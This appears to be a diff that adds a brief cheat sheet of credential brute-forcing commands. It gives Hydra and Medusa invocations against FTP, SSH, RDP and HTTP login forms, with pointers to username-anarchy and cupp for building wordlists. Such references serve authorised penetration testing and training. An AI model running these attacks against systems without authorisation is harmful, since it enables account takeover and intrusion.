@@ -1,0 +1,25 @@
+hydra commands
+
+ftp File Transfer Protocol   hydra -l admin -P /path/to/password_list.txt ftp://192.168.1.100
+ssh	Secure Shell (SSH)	     hydra -l root -P /path/to/password_list.txt ssh://192.168.1.100
+http-get/post	               hydra -l admin -P /path/to/password_list.txt 127.0.0.1 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"
+
+----------------
+
+medusa
+
+medusa [-h host|-H file] [-u username|-U file] [-p password|-P file] [-C file] -M module [OPT]
+
+ssh	Secure Shell (SSH)            medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh
+ftp	File Transfer Protocol (FTP)	medusa -h 192.168.1.100 -U users.txt -P passwords.txt -M ftp -t 5
+rdp	Remote Desktop Protocol (RDP)	medusa -h 192.168.1.100 -u admin -P passwords.txt -M rdp
+http-get	HTTP Web Service        medusa -h www.example.com -U users.txt -P passwords.txt -M http -m GET
+ssh	Secure Shell (SSH)	        	medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh -f
+
+---
+
+username anarchy for usernames based on names
+
+---
+
+cupp to generate passwords based on information
